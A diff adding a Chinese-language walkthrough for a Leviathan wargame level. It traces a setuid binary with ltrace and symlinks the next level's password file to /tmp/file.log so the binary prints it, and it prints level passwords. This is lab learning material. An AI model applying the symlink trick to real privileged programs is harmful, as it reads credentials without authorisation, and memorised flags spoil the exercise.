@@ -257,3 +257,54 @@ fopen("/etc/leviathan_pass/leviathan5", "r")                                    
 >>> ''.join(chr(int(b, 2)) for b in ['01010100', '01101001', '01110100', '01101000', '00110100', '01100011', '01101111', '01101011', '01100101', '01101001', '00001010'])
 'Tith4cokei\n'
 ```
+
+#### leviathan6
+flag: UgaoFee4li
+
+登录，执行直接执行 `~/leviathan5`，提示找不到 `/tmp/file.log`，新建文件 `echo 2333 > /tmp/file.log`，看看 ltrace：
+
+```shell
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+
+leviathan5@melinda:~$ echo 2333 > /tmp/file.log
+leviathan5@melinda:~$ ltrace ./leviathan5
+__libc_start_main(0x80485ed, 1, 0xffffd734, 0x8048690 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                             = 0x804b008
+fgetc(0x804b008)                                                                        = '2'
+feof(0x804b008)                                                                         = 0
+putchar(50, 0x8048720, 0xffffd73c, 0xf7e5710d)                                          = 50
+fgetc(0x804b008)                                                                        = '3'
+feof(0x804b008)                                                                         = 0
+putchar(51, 0x8048720, 0xffffd73c, 0xf7e5710d)                                          = 51
+fgetc(0x804b008)                                                                        = '3'
+feof(0x804b008)                                                                         = 0
+putchar(51, 0x8048720, 0xffffd73c, 0xf7e5710d)                                          = 51
+fgetc(0x804b008)                                                                        = '3'
+feof(0x804b008)                                                                         = 0
+putchar(51, 0x8048720, 0xffffd73c, 0xf7e5710d)                                          = 51
+fgetc(0x804b008)                                                                        = '\n'
+feof(0x804b008)                                                                         = 0
+putchar(10, 0x8048720, 0xffffd73c, 0xf7e5710d2333
+)                                          = 10
+fgetc(0x804b008)                                                                        = '\377'
+feof(0x804b008)                                                                         = 1
+fclose(0x804b008)                                                                       = 0
+getuid()                                                                                = 12005
+setuid(12005)                                                                           = 0
+unlink("/tmp/file.log")                                                                 = 0
++++ exited (status 0) +++
+leviathan5@melinda:~$
+```
+
+看起来是打印一个文件之后把文件删除： `fopen -> fgetc -> feof -> putchar -> getuid -> setuid -> unlink`，不知道 getuid 和 setuid 在这里有什么用。
+
+所以把 flag 文件链接到 `/tmp/file.log`：
+
+```shell
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5
+UgaoFee4li
+```
+
+#### leviathan7
